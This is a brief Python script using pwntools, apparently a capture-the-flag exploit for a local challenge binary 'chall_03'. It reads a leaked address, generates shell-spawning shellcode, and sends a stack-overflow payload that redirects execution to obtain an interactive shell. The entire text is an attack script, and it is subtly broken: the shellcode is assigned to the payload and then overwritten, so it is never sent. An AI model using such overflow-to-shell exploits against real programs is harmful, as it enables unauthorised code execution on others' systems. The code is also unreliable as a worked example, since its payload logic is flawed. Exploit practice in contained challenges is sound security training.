from pwn import *


context.arch = "amd64"
p = process("./chall_03")

p.recvuntil(b":) ")

leak = int(p.recvline().decode('utf-8').strip(), 16)
shellcode = asm(shellcraft.sh())
shellcode_len = len(shellcode)

payload = shellcode


payload = cyclic((0x70 + 0x8 ) + shellcode_len) + p64(leak)

p.sendline(payload)

p.interactive()